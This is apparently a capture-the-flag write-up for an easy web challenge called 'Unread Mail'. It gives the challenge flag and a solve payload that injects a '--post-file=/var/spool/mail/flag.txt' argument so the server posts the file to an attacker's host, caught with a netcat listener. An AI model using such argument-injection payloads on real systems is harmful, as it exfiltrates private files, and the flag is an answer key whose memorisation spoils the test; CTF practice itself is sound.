# Unread Mail
Difficulty: **Easy**
Category: **Web**

## Description:
```
Sarpeliiii.....in flag.txt

Autor: SOC
```

## Flag: FIICODE25{t00l_f4n_f0r_l1f3}

## Solve:

```json
{
  "parameters": [
 "--post-file=/var/spool/mail/flag.txt",
"http://$your_host/"]
}
```

and a nc instance on your pc
